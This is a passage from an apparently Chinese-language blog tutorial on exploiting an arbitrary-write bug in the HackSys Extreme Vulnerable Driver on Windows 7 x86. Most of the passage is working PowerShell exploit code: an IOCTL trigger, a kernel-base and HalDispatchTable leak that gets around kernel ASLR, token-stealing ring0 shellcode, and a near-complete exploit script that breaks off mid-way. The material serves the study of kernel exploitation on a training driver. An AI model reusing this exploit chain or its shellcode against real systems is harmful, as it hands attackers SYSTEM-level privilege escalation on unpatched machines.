class="string">"\\.\HacksysExtremeVulnerableDriver"</span>, [System.IO.FileAccess]::ReadWrite,</span><br><span class="line">[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, <span class="number">0</span>x3, <span class="number">0</span>x40000080, [System.IntPtr]::Zero)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hDevice</span> <span class="nomarkup">-eq</span> -<span class="number">1</span>) &#123;</span><br><span class="line">    echo <span class="string">"`n[!] Unable to get driver handle..`n"</span></span><br><span class="line">    <span class="keyword">Return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"`n[&gt;] Driver information.."</span></span><br><span class="line">    echo <span class="string">"[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"</span></span><br><span class="line">    echo <span class="string">"[+] Handle: <span class="variable">$hDevice</span>"</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Buffer = WriteWhat + WriteWhere</span></span><br><span class="line"><span class="variable">$Buffer</span> = [Byte[]](<span class="number">0</span>x41)*<span class="number">0</span>x4 + [Byte[]](<span class="number">0</span>x42)*<span class="number">0</span>x4</span><br><span class="line">echo <span class="string">"`n[&gt;] Sending buffer.."</span></span><br><span class="line">echo <span class="string">"[+] Buffer length: $(<span class="variable">$Buffer</span>.Length)"</span></span><br><span class="line">echo <span class="string">"[+] IOCTL: 0x22200B`n"</span></span><br><span class="line">[EVD]::DeviceIoControl(<span class="variable">$hDevice</span>, <span class="number">0</span>x22200B, <span class="variable">$Buffer</span>, <span class="variable">$Buffer</span>.Length, <span class="literal">$null</span>, <span class="number">0</span>, [ref]<span class="number">0</span>, [System.IntPtr]::Zero)|<span class="built_in">Out-null</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/exploit/fuzzySecurity/20180201_2.jpg" alt=""></p>
+<p>很好，我们有了exp的原型。</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>真正的问题是到底要覆盖哪个地址（在内核空间），如何找到可信赖的地址，执行后不会BSOD（蓝屏）。幸运的是这项艰巨的工作已经有人做过了，我们可以覆盖一个内核的分发表指针，这相对来说安全（在Ruben Santamarta的2007年发表的“Exploiting common flaws in drivers”论文中第一次描述）。它揭示出有一个未文档化（罕用）的函数——NtQueryIntervalProfile用于量度计数滴答之间的性能。这个函数内部调用了KeQueryIntervalProfile系统调用。反汇编KeQueryIntervalProfile，看起来没什么特别的。</p>
+<p><img src="/images/exploit/fuzzySecurity/20180201_3.jpg" alt=""></p>
+<p>NtQueryIntervalProfile最终会调用一个在HalDispatchTable+0x4处的指针。如果我们可以覆盖该指针使其指向我们的shellcode，那么当调用NtQueryIntervalProfile时我们的shellcode就可以在内核层运行了。</p>
+<p>现在我们知道了想要覆盖的地方，我们还需要弄清楚如何找到HalDispatchTable的地址。幸运的是，我们可以利用一个有用的未文档化的函数——NtQuerySystemInformation。如果我们调用NtQuerySystemInformation且指定SystemModuleInformation类我们可以获取一个加载的模块列表以及他们各自的基地址（包括NT内核）。我将节约读者去看关于该函数糟糕的细节的时间，我写了一个PowerShell脚本来做这一项工作， <a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-SystemModuleInformation.ps1" target="_blank" rel="noopener">Get-SystemModuleInformation</a>。</p>
+<p><img src="/images/exploit/fuzzySecurity/20180201_4.jpg" alt=""></p>
+<p>它有效的绕过了内核中的ASLR，因为我们可以使用加载模块的基地址来计算任意函数的偏移。下面你会看到使用简单的指针算术运算来获取HalDispatchTable偏移的过程。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SystemModuleArray</span> = Get-SystemModuleInformation</span><br><span class="line"><span class="variable">$KernelBase</span> = <span class="variable">$SystemModuleArray</span>[<span class="number">0</span>].ImageBase</span><br><span class="line"><span class="variable">$KernelType</span> = (<span class="variable">$SystemModuleArray</span>[<span class="number">0</span>].ImageName -split <span class="string">"\\"</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="variable">$KernelHanle</span> = [Kernel32]::LoadLibrary(<span class="string">"<span class="variable">$KernelType</span>"</span>)</span><br><span class="line"><span class="variable">$HALUserLand</span> = [Kernel32]::GetProcAddress(<span class="variable">$KernelHanle</span>, <span class="string">"HalDispatchTable"</span>)</span><br><span class="line"><span class="variable">$HalDispatchTable</span> = <span class="variable">$HALUserLand</span>.ToInt32() - <span class="variable">$KernelHanle</span> + <span class="variable">$KernelBase</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/exploit/fuzzySecurity/20180201_5.jpg" alt=""></p>
+<p><img src="/images/exploit/fuzzySecurity/20180201_6.jpg" alt=""></p>
+<p>我们可以重用上一节创建的窃取token的shellcode，完善其中的一部分。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Shellcode</span> = [Byte[]] @(</span><br><span class="line">    <span class="comment">#---[Setup]</span></span><br><span class="line">    <span class="number">0</span>x60,                               <span class="comment"># pushad</span></span><br><span class="line">    <span class="number">0</span>x64, <span class="number">0</span>xA1, <span class="number">0</span>x24, <span class="number">0</span>x01, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov eax, fs:[KTHREAD_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x40, <span class="number">0</span>x50,                   <span class="comment"># mov eax, [eax + EPROCESS_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x89, <span class="number">0</span>xC1,                         <span class="comment"># mov ecx, eax (Current _EPROCESS structure)</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x98, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov ebx, [eax + TOKEN_OFFSET]</span></span><br><span class="line">    <span class="comment">#---[Copy System PID token]</span></span><br><span class="line">    <span class="number">0</span>xBA, <span class="number">0</span>x04, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00,       <span class="comment"># mov edx, 4 (SYSTEM PID)</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x80, <span class="number">0</span>xB8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov eax, [eax + FLINK_OFFSET] &lt;-|</span></span><br><span class="line">    <span class="number">0</span>x2D, <span class="number">0</span>xB8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00,       <span class="comment"># sub eax, FLINK_OFFSET           |</span></span><br><span class="line">    <span class="number">0</span>x39, <span class="number">0</span>x90, <span class="number">0</span>xB4, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># cmp [eax + PID_OFFSET], edx     |</span></span><br><span class="line">    <span class="number">0</span>x75, <span class="number">0</span>xED,                         <span class="comment"># jnz                           -&gt;|</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x90, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov edx, [eax + TOKEN_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x89, <span class="number">0</span>x91, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov [ecx + TOKEN_OFFSET], edx</span></span><br><span class="line">    <span class="comment">#---[Recover]</span></span><br><span class="line">    <span class="number">0</span>x61,                               <span class="comment"># popad</span></span><br><span class="line">    <span class="number">0</span>xC3                                <span class="comment"># ret</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>我们无需还原那些此前所用的额外说明。此外，我们劫持了一个函数调用，所以需要保存寄存器的状态，shellcode执行后需要返回到执行流继续正常执行。</p>
+<h2 id="终结"><a href="#终结" class="headerlink" title="终结"></a>终结</h2><p>这就是完整的运行体，设置指针以及分配shellcode的过程中海有一些次要的细节。可以参考下面完整的exp来了解更多信息。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> -TypeDefinition <span class="string">@"</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">using System.Security.Principal;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential, Pack = 1)]</span></span><br><span class="line"><span class="string">public struct SYSTEM_MODULE_INFORMATION</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]</span></span><br><span class="line"><span class="string">    public UIntPtr[] Reserved;</span></span><br><span class="line"><span class="string">    public IntPtr ImageBase;</span></span><br><span class="line"><span class="string">    public UInt32 ImageSize;</span></span><br><span class="line"><span class="string">    public UInt32 Flags;</span></span><br><span class="line"><span class="string">    public UInt16 LoadOrderIndex;</span></span><br><span class="line"><span class="string">    public UInt16 InitOrderIndex;</span></span><br><span class="line"><span class="string">    public UInt16 LoadCount;</span></span><br><span class="line"><span class="string">    public UInt16 ModuleNameOffset;</span></span><br><span class="line"><span class="string">    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]</span></span><br><span class="line"><span class="string">    internal Char[] _ImageName;</span></span><br><span class="line"><span class="string">    public String ImageName &#123;</span></span><br><span class="line"><span class="string">        get &#123;</span></span><br><span class="line"><span class="string">            return new String(_ImageName).Split(new Char[] &#123;'\0'&#125;, 2)[0];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">public static class EVD</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr LoadLibrary(</span></span><br><span class="line"><span class="string">            string lpFileName);</span></span><br><span class="line"><span class="string">          </span></span><br><span class="line"><span class="string">    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]</span></span><br><span class="line"><span class="string">        public static extern IntPtr GetProcAddress(</span></span><br><span class="line"><span class="string">            IntPtr hModule,</span></span><br><span class="line"><span class="string">            string procName);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("kernel32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr VirtualAlloc(</span></span><br><span class="line"><span class="string">        IntPtr lpAddress,</span></span><br><span class="line"><span class="string">        uint dwSize,</span></span><br><span class="line"><span class="string">        UInt32 flAllocationType,</span></span><br><span class="line"><span class="string">        UInt32 flProtect);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr CreateFile(</span></span><br><span class="line"><span class="string">        String lpFileName,</span></span><br><span class="line"><span class="string">        UInt32 dwDesiredAccess,</span></span><br><span class="line"><span class="string">        UInt32 dwShareMode,</span></span><br><span class="line"><span class="string">        IntPtr lpSecurityAttributes,</span></span><br><span class="line"><span class="string">        UInt32 dwCreationDisposition,</span></span><br><span class="line"><span class="string">        UInt32 dwFlagsAndAttributes,</span></span><br><span class="line"><span class="string">        IntPtr hTemplateFile);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("Kernel32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">    public static extern bool DeviceIoControl(</span></span><br><span class="line"><span class="string">        IntPtr hDevice,</span></span><br><span class="line"><span class="string">        int IoControlCode,</span></span><br><span class="line"><span class="string">        byte[] InBuffer,</span></span><br><span class="line"><span class="string">        int nInBufferSize,</span></span><br><span class="line"><span class="string">        byte[] OutBuffer,</span></span><br><span class="line"><span class="string">        int nOutBufferSize,</span></span><br><span class="line"><span class="string">        ref int pBytesReturned,</span></span><br><span class="line"><span class="string">        IntPtr Overlapped);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("ntdll.dll")]</span></span><br><span class="line"><span class="string">    public static extern int NtQuerySystemInformation(</span></span><br><span class="line"><span class="string">        int SystemInformationClass,</span></span><br><span class="line"><span class="string">        IntPtr SystemInformation,</span></span><br><span class="line"><span class="string">        int SystemInformationLength,</span></span><br><span class="line"><span class="string">        ref int ReturnLength);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("ntdll.dll")]</span></span><br><span class="line"><span class="string">    public static extern uint NtQueryIntervalProfile(</span></span><br><span class="line"><span class="string">        UInt32 ProfileSource,</span></span><br><span class="line"><span class="string">        ref UInt32 Interval);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    [DllImport("kernel32.dll")]</span></span><br><span class="line"><span class="string">    public static extern uint GetLastError();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"@</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Call NtQuerySystemInformation-&gt;SystemModuleInformation</span></span><br><span class="line"><span class="comment"># &amp; Alloc buffer for the result</span></span><br><span class="line">[int]<span class="variable">$BuffPtr_Size</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">$true</span>) &#123;</span><br><span class="line">    [IntPtr]<span class="variable">$BuffPtr</span> = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(<span class="variable">$BuffPtr_Size</span>)</span><br><span class="line">    <span class="variable">$SystemInformationLength</span> = <span class="built_in">New-Object</span> Int</span><br><span class="line">    <span class="comment"># SystemModuleInformation Class = 11</span></span><br><span class="line">    <span class="variable">$CallResult</span> = [EVD]::NtQuerySystemInformation(<span class="number">11</span>, <span class="variable">$BuffPtr</span>, <span class="variable">$BuffPtr_Size</span>, [ref]<span class="variable">$SystemInformationLength</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># STATUS_INFO_LENGTH_MISMATCH</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$CallResult</span> <span class="nomarkup">-eq</span> <span class="number">0</span>xC0000004) &#123;</span><br><span class="line">        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(<span class="variable">$BuffPtr</span>)</span><br><span class="line">        [int]<span class="variable">$BuffPtr_Size</span> = [System.Math]::Max(<span class="variable">$BuffPtr_Size</span>,<span class="variable">$SystemInformationLength</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$CallResult</span> <span class="nomarkup">-eq</span> <span class="number">0</span>x00000000) &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># Probably: 0xC0000005 -&gt; STATUS_ACCESS_VIOLATION</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(<span class="variable">$BuffPtr</span>)</span><br><span class="line">        echo <span class="string">"[!] Error, NTSTATUS Value: $('&#123;0:X&#125;' -f (<span class="variable">$CallResult</span>))`n"</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Create SystemModuleInformation struct</span></span><br><span class="line"><span class="variable">$SYSTEM_MODULE_INFORMATION</span> = <span class="built_in">New-Object</span> SYSTEM_MODULE_INFORMATION</span><br><span class="line"><span class="variable">$SYSTEM_MODULE_INFORMATION</span> = <span class="variable">$SYSTEM_MODULE_INFORMATION</span>.GetType()</span><br><span class="line"><span class="keyword">if</span> ([System.IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="variable">$SYSTEM_MODULE_INFORMATION_Size</span> = <span class="number">284</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$SYSTEM_MODULE_INFORMATION_Size</span> = <span class="number">296</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Read SystemModuleInformation array count</span></span><br><span class="line"><span class="comment"># &amp; increment offset IntPtr size</span></span><br><span class="line"><span class="variable">$BuffOffset</span> = <span class="variable">$BuffPtr</span>.ToInt64()</span><br><span class="line"><span class="variable">$HandleCount</span> = [System.Runtime.InteropServices.Marshal]::ReadInt32(<span class="variable">$BuffOffset</span>)</span><br><span class="line"><span class="variable">$BuffOffset</span> = <span class="variable">$BuffOffset</span> + [System.IntPtr]::Size</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Loop SystemModuleInformation array</span></span><br><span class="line"><span class="comment"># &amp; store output in $SystemModuleArray</span></span><br><span class="line"><span class="variable">$SystemModuleArray</span> = @()</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$HandleCount</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$SystemPointer</span> = <span class="built_in">New-Object</span> System.Intptr -ArgumentList <span class="variable">$BuffOffset</span></span><br><span class="line">    <span class="variable">$Cast</span> = [system.runtime.interopservices.marshal]::PtrToStructure(<span class="variable">$SystemPointer</span>,[type]<span class="variable">$SYSTEM_MODULE_INFORMATION</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="variable">$HashTable</span> = @&#123;</span><br><span class="line">        ImageName = <span class="variable">$Cast</span>.ImageName</span><br><span class="line">        ImageBase = <span class="keyword">if</span> ([System.IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>) &#123;$(<span class="variable">$Cast</span>.ImageBase).ToInt32()&#125; <span class="keyword">else</span> &#123;$(<span class="variable">$Cast</span>.ImageBase).ToInt64()&#125;</span><br><span class="line">        ImageSize = <span class="string">"0x$('&#123;0:X&#125;' -f <span class="variable">$Cast</span>.ImageSize)"</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="variable">$Object</span> = <span class="built_in">New-Object</span> PSObject -Property <span class="variable">$HashTable</span></span><br><span class="line">    <span class="variable">$SystemModuleArray</span> += <span class="variable">$Object</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$BuffOffset</span> = <span class="variable">$BuffOffset</span> + <span class="variable">$SYSTEM_MODULE_INFORMATION_Size</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Free SystemModuleInformation array</span></span><br><span class="line">[System.Runtime.InteropServices.Marshal]::FreeHGlobal(<span class="variable">$BuffPtr</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Get pointer to nt!HalDispatchTable</span></span><br><span class="line">echo <span class="string">"`n[&gt;] Leaking HalDispatchTable pointer.."</span></span><br><span class="line"><span class="variable">$KernelBase</span> = <span class="variable">$SystemModuleArray</span>[<span class="number">0</span>].ImageBase</span><br><span class="line"><span class="variable">$KernelType</span> = (<span class="variable">$SystemModuleArray</span>[<span class="number">0</span>].ImageName -split <span class="string">"\\"</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="variable">$KernelHanle</span> = [EVD]::LoadLibrary(<span class="string">"<span class="variable">$KernelType</span>"</span>)</span><br><span class="line"><span class="variable">$HALUserLand</span> = [EVD]::GetProcAddress(<span class="variable">$KernelHanle</span>, <span class="string">"HalDispatchTable"</span>)</span><br><span class="line"><span class="variable">$HalDispatchTable</span> = <span class="variable">$HALUserLand</span>.ToInt32() - <span class="variable">$KernelHanle</span> + <span class="variable">$KernelBase</span></span><br><span class="line"><span class="variable">$WriteWhere</span> = [System.BitConverter]::GetBytes(<span class="variable">$HalDispatchTable</span>+<span class="number">4</span>)</span><br><span class="line">echo <span class="string">"[+] Kernel Base: 0x$('&#123;0:X&#125;' -f <span class="variable">$KernelBase</span>)"</span></span><br><span class="line">echo <span class="string">"[+] HalDispatchTable: 0x$('&#123;0:X&#125;' -f <span class="variable">$HalDispatchTable</span>)"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Compiled with Keystone-Engine</span></span><br><span class="line"><span class="comment"># Hardcoded offsets for Win7 x86 SP1</span></span><br><span class="line"><span class="variable">$Shellcode</span> = [Byte[]] @(</span><br><span class="line">    <span class="comment">#---[Setup]</span></span><br><span class="line">    <span class="number">0</span>x60,                               <span class="comment"># pushad</span></span><br><span class="line">    <span class="number">0</span>x64, <span class="number">0</span>xA1, <span class="number">0</span>x24, <span class="number">0</span>x01, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov eax, fs:[KTHREAD_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x40, <span class="number">0</span>x50,                   <span class="comment"># mov eax, [eax + EPROCESS_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x89, <span class="number">0</span>xC1,                         <span class="comment"># mov ecx, eax (Current _EPROCESS structure)</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x98, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov ebx, [eax + TOKEN_OFFSET]</span></span><br><span class="line">    <span class="comment">#---[Copy System PID token]</span></span><br><span class="line">    <span class="number">0</span>xBA, <span class="number">0</span>x04, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00,       <span class="comment"># mov edx, 4 (SYSTEM PID)</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x80, <span class="number">0</span>xB8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov eax, [eax + FLINK_OFFSET] &lt;-|</span></span><br><span class="line">    <span class="number">0</span>x2D, <span class="number">0</span>xB8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00,       <span class="comment"># sub eax, FLINK_OFFSET           |</span></span><br><span class="line">    <span class="number">0</span>x39, <span class="number">0</span>x90, <span class="number">0</span>xB4, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># cmp [eax + PID_OFFSET], edx     |</span></span><br><span class="line">    <span class="number">0</span>x75, <span class="number">0</span>xED,                         <span class="comment"># jnz                           -&gt;|</span></span><br><span class="line">    <span class="number">0</span>x8B, <span class="number">0</span>x90, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov edx, [eax + TOKEN_OFFSET]</span></span><br><span class="line">    <span class="number">0</span>x89, <span class="number">0</span>x91, <span class="number">0</span>xF8, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="number">0</span>x00, <span class="comment"># mov [ecx + TOKEN_OFFSET], edx</span></span><br><span class="line">    <span class="comment">#---[Recover]</span></span><br><span class="line">    <span class="number">0</span>x61,                               <span class="comment"># popad</span></span><br><span class="line">    <span class="number">0</span>xC3                                <span class="comment"># ret</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Write shellcode to memory</span></span><br><span class="line">echo <span class="string">"`n[&gt;] Allocating ring0 payload.."</span></span><br><span class="line">[IntPtr]<span class="variable">$Pointer</span> = [EVD]::VirtualAlloc([System.IntPtr]::Zero, <span class="variable">$Shellcode</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x40)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$Shellcode</span>, <span class="number">0</span>, <span class="variable">$Pointer</span>, <span class="variable">$Shellcode</span>.Length)</span><br><span class="line"><span class="variable">$WriteWhat</span> = [System.BitConverter]::GetBytes(<span class="variable">$Pointer</span>.ToInt32())</span><br><span class="line">echo <span class="string">"[+] Payload size: $(<span class="variable">$Shellcode</span>.Length)"</span></span><br><span class="line">echo <span class="string">"[+] Payload address: 0x$("</span>&#123;<span class="number">0</span>:X8&#125;<span class="string">" -f <span class="variable">$Pointer</span>.ToInt32())"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 